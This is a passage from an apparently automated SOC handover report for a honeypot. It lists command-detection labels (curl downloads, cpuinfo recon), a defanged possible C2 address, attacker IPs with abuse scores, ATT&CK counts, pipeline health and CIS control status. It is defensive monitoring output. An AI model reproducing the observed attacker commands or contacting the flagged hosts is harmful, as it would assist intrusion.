- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `221.166.164[.]167` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `130.12.180[.]174` | NL | Virtualine Technologies | **100** ⚠️ | 50 |
| `117.72.212[.]5` | CN | Beijing Jingdong 360 Degree E-commerce Co., Ltd. | **100** ⚠️ | 21 |
| `45.224.97[.]244` | EC | NEGOCIOS Y TELEFONIA NEDETEL S.A. | **100** ⚠️ | 21 |
| `66.132.195[.]88` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `69.164.217[.]245` | US | Linode | **100** ⚠️ | 50 |
| `69.164.217[.]74` | US | Linode | **100** ⚠️ | 50 |
| `185.254.207[.]200` | ES | CLOUDI NEXTGEN SL | **100** ⚠️ | 0 |
| `73.120.0[.]169` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 0 |
| `54.197.86[.]219` | US | Amazon.com, Inc. | **100** ⚠️ | 20 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 192 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 177 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 43 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 37 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 36 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 14 |
| AbuseIPDB score 16 below threshold 25 | 13 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 432 cases |
| Tool 34  | Credential Extractor        | ✅ 239 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 26 fingerprints |
| Tool 36  | Command Clustering          | ✅ 15 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 123 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (8.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 169 priority case(s) shown individually · 75 recon entry/entries in table (32 group(s) consolidating 183 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-29T08:07:19Z_
